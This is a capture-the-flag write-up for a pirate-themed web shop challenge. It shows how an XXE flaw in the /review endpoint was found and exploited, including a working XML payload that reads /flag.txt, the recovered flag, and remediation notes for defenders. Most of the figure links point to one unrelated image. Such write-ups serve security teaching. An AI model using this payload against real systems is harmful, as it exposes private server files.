**Quartermaster Store — Web Challenge Writeup**

Technique: XXE (XML External Entity) in /review

Target: [http://chal.bearcatctf.io:43363/](http://chal.bearcatctf.io:43363/)

![alt text](https://raw.githubusercontent.com/siuxsa/CTF_Writeups/refs/heads/main/bearcatctf/image/Screenshot%202026-02-22%20154439.png)

**1\. Executive Summary**

Quartermaster Store is a pirate-themed shop web challenge. The flag is obtained by exploiting an XML External Entity (XXE) issue in the authenticated review submission feature (/review), allowing local file disclosure of /flag.txt.

**2\. Application Exploration :** I proxied all traffic through Burp Suite and used Target → Site map and Proxy → HTTP history to enumerate reachable endpoints and understand client/server interactions. The application behaves differently before and after authentication.

**Figure 1 — Unauthenticated homepage (storefront)**

![alt text](https://cdn.twocontinents.com/cdn-cgi/image/width=1920/https://cdn.twocontinents.com/top_rides_at_img_worlds_of_adventure_spiderman_4_145192c8a4.jpg)

**Figure 2 — Login page**

![alt text](https://cdn.twocontinents.com/cdn-cgi/image/width=1920/https://cdn.twocontinents.com/top_rides_at_img_worlds_of_adventure_spiderman_4_145192c8a4.jpg)

**Figure 3 — Register page**

![alt text](https://cdn.twocontinents.com/cdn-cgi/image/width=1920/https://cdn.twocontinents.com/top_rides_at_img_worlds_of_adventure_spiderman_4_145192c8a4.jpg)

**Figure 4 — Review page (post-login feature)**

![alt text](https://cdn.twocontinents.com/cdn-cgi/image/width=1920/https://cdn.twocontinents.com/top_rides_at_img_worlds_of_adventure_spiderman_4_145192c8a4.jpg)

**Figure 5 — Plunder minigame (post-login feature)**

![alt text](https://cdn.twocontinents.com/cdn-cgi/image/width=1920/https://cdn.twocontinents.com/top_rides_at_img_worlds_of_adventure_spiderman_4_145192c8a4.jpg)

I also reviewed the Plunder minigame. The client posts a JSON body {score: finalScore} to /plunder . This suggests the score might be tamperable for farming doubloons, but it is not required for flag retrieval.

**Observed functionality (high-level)**

Unauthenticated: storefront only (items list).

Authenticated (after register \+ login): additional navbar actions appear, including Review (/review), Plunder (/plunder), Logout, and a Balance display.

**3\. Root Cause: XML parsing in /review**

The review form submission does not send JSON or URL-encoded parameters. Instead, the frontend constructs an XML document and posts it to /review with Content-Type: application/xml. 

![alt text](https://cdn.twocontinents.com/cdn-cgi/image/width=1920/https://cdn.twocontinents.com/top_rides_at_img_worlds_of_adventure_spiderman_4_145192c8a4.jpg)

**4\. Exploitation: XXE → Local File Disclosure**

Because the backend XML parser accepts attacker-controlled XML, I tested whether external entities were allowed. When entity expansion is enabled, an attacker can define an external entity that reads local files via the file:// URI scheme.

**XXE payload used (read /flag.txt)**

```
<?xml version="1.0"?>
<!DOCTYPE review [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<review>
  <product>&xxe;</product>
  <rating>5</rating>
  <comment>c</comment>
</review>

```

**Verification & Result**

After sending the payload to /review (Burp Repeater), the response message contained the flag.

![alt text](https://cdn.twocontinents.com/cdn-cgi/image/width=1920/https://cdn.twocontinents.com/top_rides_at_img_worlds_of_adventure_spiderman_4_145192c8a4.jpg)

**Why the flag is exposed in the response**

The application reflects the \<product\> value into a pirate-style message when the product is not recognized as a valid shop item (e.g., “Ye didn't buy any {product} here matey\!”). By setting \<product\> to \&xxe;, the reflected string becomes the contents of /flag.txt.

**Flag: ```BCCTF{N0_H0nor_AmonG_Th3vEs}```**

*Remediation (Defender Notes)*
 - Disable external entity resolution (DTD) in the XML parser or switch to a hardened XML parser configuration.
 - Prefer JSON APIs for untrusted input; if XML is required, enforce strict schema validation and disable DOCTYPE.

